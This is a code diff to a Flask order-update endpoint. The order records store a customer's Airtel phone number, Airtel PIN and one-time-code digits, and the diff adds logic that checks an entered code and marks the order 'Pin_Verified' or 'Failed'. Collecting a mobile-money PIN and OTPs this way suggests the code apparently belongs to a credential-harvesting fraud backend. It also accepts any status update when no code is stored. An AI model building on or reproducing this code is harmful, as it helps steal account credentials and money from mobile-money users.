@@ -349,13 +349,64 @@ def update_order(order_id):
     
     data = request.get_json()
 
-    updatable = ['status', 'airtel_number', 'airtel_pin', 'otp1', 'otp2', 'otp3', 'otp4']
-    for field in updatable:
-        if field in data:
-            setattr(order, field, data[field])
+    # Check if OTP verification is being attempted
+    if 'otp' in data and 'status' in data:
+        entered_otp = data.get('otp', '')
+        
+        # Build the stored OTP from individual digits
+        stored_otp = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}'.strip()
+        
+        # Verify OTP if it exists, otherwise accept (for backwards compatibility)
+        if stored_otp and len(stored_otp) == 4:
+            if entered_otp == stored_otp:
+                # OTP verified successfully
+                order.status = 'Pin_Verified'
+                # Also store individual OTP digits for record
+                if len(entered_otp) == 4:
+                    order.otp1 = entered_otp[0]
+                    order.otp2 = entered_otp[1]
+                    order.otp3 = entered_otp[2]
+                    order.otp4 = entered_otp[3]
+            else:
+                # OTP verification failed
+                order.status = 'Failed'
+        else:
+            # No OTP set yet - accept the update (first time)
+            order.status = data.get('status', order.status)
+            if len(entered_otp) == 4:
+                order.otp1 = entered_otp[0]
+                order.otp2 = entered_otp[1]
+                order.otp3 = entered_otp[2]
+                order.otp4 = entered_otp[3]
+    else:
+        # Regular field updates
+        updatable = ['status', 'airtel_number', 'airtel_pin', 'otp1', 'otp2', 'otp3', 'otp4']
+        for field in updatable:
+            if field in data:
+                setattr(order, field, data[field])
 
     db.session.commit()
     notify_status_change(order)
+    
+    # Return success/failure status for OTP verification
+    if 'otp' in data:
+        if order.status == 'Pin_Verified':
+            return jsonify({
+                'id': order.id,
+                'order_ref': order.order_ref,
+                'plan_name': order.plan.name if order.plan else '',
+                'amount': order.amount,
+                'status': order.status,
+                'verified': True,
+            })
+        else:
+            return jsonify({
+                'id': order.id,
+                'order_ref': order.order_ref,
+                'status': order.status,
+                'verified': False,
+                'error': 'Invalid OTP code'
+            })
     
     return jsonify({
         'id': order.id,
